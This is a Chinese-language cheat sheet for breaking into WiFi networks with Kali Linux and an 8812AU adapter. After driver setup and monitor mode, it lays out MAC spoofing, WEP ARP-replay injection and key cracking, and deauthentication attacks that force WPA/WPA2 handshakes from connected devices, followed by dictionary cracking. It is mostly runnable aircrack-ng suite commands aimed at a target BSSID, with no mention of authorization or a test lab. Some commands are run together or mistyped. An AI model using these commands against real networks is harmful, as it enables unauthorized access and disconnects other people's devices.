Kali Linux WiFi渗透指南 (8812AU驱动)#

驱动安装步骤#

1.安装内核头文件#

apt install linux-headers-$(uname -r)

2.搜索可用头文件版本#

apt-cache search linux-headers

3.安装Realtek驱动#

sudo apt install realtek-rtl88xxau-dkms

开启监听模式（注意接口名称）#

airmon-ng start wlan0

验证接口状态（成功后应为wlan0mon）#

iwconfig 通用配置技巧

MAC地址欺骗（建议在监听前操作）#

ifconfig wlan0 down macchanger -m 38:FC:98:6B:CE:57 wlan0

扫描2.4G频段#

airodump-ng wlan0mon

扫描5G频段（指定频率范围）#

airodump-ng -C 5180-5880 wlan0mon airodump-ng -c [信道] -w wep_capture –bssid [目标BSSID] wlan0mon

ARP请求重放攻击#

aireplay-ng -3 -b [BSSID] -h [伪造MAC] wlan0mon

或主动攻击（强制生成数据包）#

aireplay-ng -9 -b [BSSID] wlan0mon

当IVs达到20000+时执行#

aircrack-ng -b [BSSID] wep_capture-01.cap

WPA/WPA2破解流程#

捕获握手包#

airodump-ng -c [信道] -w wpa_capture –bssid [目标BSSID] wlan0mon

解除认证攻击#

aireplay-ng -0 10 -a [BSSID] -c [已连接设备MAC] wlan0mon

出现"WPA handshake"提示后终止抓包

字典破解#

aircrack-ng -w [字典路径] wpa_capture-01.cap

常见问题解决#

监听模式失效#

确认驱动版本：modinfo 8812au 尝试强制启动：airmon-ng start wlan0 –force

5GHz支持问题#

检查网卡能力：iwlist wlan0 freq 使用指定频段扫描

握手包捕获失败#

增加攻击次数：aireplay-ng -0 30 尝试不同时间段攻击
